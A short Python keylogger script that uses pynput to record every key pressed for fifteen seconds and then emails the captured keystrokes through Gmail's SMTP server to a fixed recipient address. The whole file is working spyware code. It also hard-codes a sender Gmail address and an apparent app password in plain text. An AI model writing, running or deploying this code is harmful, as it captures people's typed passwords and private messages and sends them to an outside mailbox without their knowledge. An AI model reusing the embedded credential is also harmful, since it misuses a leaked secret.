import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard
import datetime
import time

SEC = 15

# Email configuration
SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587
SENDER_EMAIL = 'ghazallbakhshande@gmail.com'
SENDER_PASSWORD = 'xoferlyhyevvpqio'
RECIPIENT_EMAIL = 'Ghazal.best76@gmail.com'

# Keyboard logger
logs = []

def on_press(key):
    try:
        logs.append(str(key.char))
    except AttributeError:
        logs.append(str(key.name))

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def send_logs():
    message = MIMEMultipart()
    message['From'] = SENDER_EMAIL
    message['To'] = RECIPIENT_EMAIL
    message['Subject'] = 'Keyboard Logs'
    message.attach(
        MIMEText(
            'Keys pressed are listed below:\n\nKey pressed: ' 
            + '\nKey pressed: '.join(logs), 
            'plain')
    )

    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
        server.starttls()
        server.login(SENDER_EMAIL, SENDER_PASSWORD)
        server.send_message(message)


if __name__ == "__main__":
    print(f'Press some keys.\n')

    # Start the keyboard listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    time.sleep(SEC)
    listener.stop()

    send_logs()
    print('Email sent successfuly.')
